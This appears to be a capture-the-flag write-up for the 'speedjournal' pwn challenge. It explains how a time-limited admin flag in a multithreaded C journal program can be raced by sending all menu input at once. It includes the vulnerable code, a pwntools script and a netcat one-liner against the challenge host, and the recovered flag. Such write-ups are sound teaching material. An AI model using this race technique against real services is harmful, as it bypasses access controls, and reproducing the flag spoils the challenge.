---
title: "speedjournal"
summary: "Exploiting a TOCTOU race condition to bypass authentication checks."
date: 2026-01-10
topics: ["pwn"]
ctfs: ["scarlet-25"]
tags: ["race-condition", "threading", "input-buffering"]
draft: false
---

> Its 2026, I need to start journal-maxing. Thats why I use speedjournal, which lets me brain-max my thoughts while time-maxing with the speed of C! Its also security-maxed so only I can read my private entries!

```sh
nc challs.ctf.rusec.club 22169
```

---

This challenge presents a simple logging system where the flag is stored in a restricted log entry. Only authenticated admin users should be able to read restricted logs, but a timing vulnerability allows us to bypass this check.

---

## Overview

The program is a multi-threaded journal application with the following features:

- Admin authentication with a password
- Writing new log entries (restricted or public)
- Reading log entries (with access control for restricted entries)
- A flag stored in a restricted log at index 0

```
1. Login admin
2. Write log
3. Read log
4. Exit
```

---

## Vulnerability analysis

### The authentication mechanism

When you log in as admin, the system sets a global flag but immediately starts a background thread that resets it after a short delay:

```c
int is_admin = 0;  // global authentication flag

void *logout_thread(void *arg) {
    usleep(WAIT_TIME);  // sleep for 1000 microseconds (1ms)
    is_admin = 0;       // automatically log out
    return NULL;
}

void login_admin() {
    char pw[32];
    printf("Admin password: ");
    fgets(pw, sizeof(pw), stdin);

    if (strncmp(pw, "supersecret\n", 12) == 0) {
        is_admin = 1;  // set admin flag

        pthread_t t;
        pthread_create(&t, NULL, logout_thread, NULL);
        pthread_detach(t);

        puts("[+] Admin logged in (temporarily)");
    }
}
```

The logout happens after only **1000 microseconds (1 millisecond)**. This seems like it would be too fast to exploit, but there's a critical detail that makes this vulnerable.

---

### The access control check

Reading a restricted log requires admin privileges:

```c
void read_log() {
    int idx;
    printf("Index: ");
    scanf("%d", &idx);
    getchar();

    if (idx < 0 || idx >= log_count) {
        puts("Invalid index");
        return;
    }

    if (logs[idx].restricted && !is_admin) {  // race condition here
        puts("Access denied");
        return;
    }

    printf("Log: %s\n", logs[idx].content);
}
```

The vulnerability is a **race condition** between the main thread and the logout thread. While `is_admin` is set to 1, we have a narrow window to read the restricted log before the background thread resets it to 0.

---

### Input buffering: the key to exploitation

The critical insight is that `scanf()` and `fgets()` read from a **buffered input stream**. When you send multiple lines at once, they're stored in the input buffer and processed sequentially without delay.

This means we can send our entire command sequence instantly:

```
1                  # Select "Login admin"
supersecret        # Enter password
3                  # Select "Read log"
0                  # Read index 0 (the flag)
```

When these commands are all sent together, here's what happens:

1. The program reads `1` from the buffer → calls `login_admin()`
2. `login_admin()` reads `supersecret\n` from the buffer → sets `is_admin = 1`
3. The logout thread is created but **hasn't executed yet**
4. Control returns to main, which reads `3` from the buffer → calls `read_log()`
5. `read_log()` reads `0` from the buffer and checks `is_admin` → **still 1!**
6. The flag is printed
7. (Later) The logout thread finally executes

Because all the input is pre-buffered, the entire sequence executes **much faster than 1 millisecond**. The program never has to wait for user input, so it completes before the logout thread can fire.

---

## Exploitation

### Method 1: Using pwntools

```python
from pwn import *

p = remote("challs.ctf.rusec.club", 22169)
p.sendafter(b"> ", b"1\nsupersecret\n3\n0\n")
p.interactive()
```

The `sendafter()` call waits for the prompt, then sends all four commands at once. They're processed from the buffer faster than the thread can reset `is_admin`.

---

### Method 2: Using netcat and printf

```sh
printf "1\nsupersecret\n3\n0\n" | nc challs.ctf.rusec.club 22169
```

This pipes all the input at once, achieving the same buffering effect.

---

### Execution trace

```
1. Login admin
2. Write log
3. Read log
4. Exit
> Admin password: [+] Admin logged in (temporarily)

1. Login admin
2. Write log
3. Read log
4. Exit
> Index: Log: RUSEC{wow_i_did_a_data_race}

1. Login admin
2. Write log
3. Read log
4. Exit
>
```

Notice how all the prompts appear sequentially with no delay. The entire sequence completes before the 1ms timer expires.

---

## Why this works

The exploit succeeds because of three factors:

1. **Input buffering**: Commands are read from a buffer, not interactively
2. **Fast execution**: Reading from a buffer is much faster than 1ms
3. **Threading timing**: The logout thread doesn't preempt the main thread immediately

Even though 1 millisecond seems very short, it's an eternity in CPU time. A modern processor can execute millions of instructions in 1ms. Our buffered input is processed in microseconds.

---

## Flag

```
RUSEC{wow_i_did_a_data_race}
```
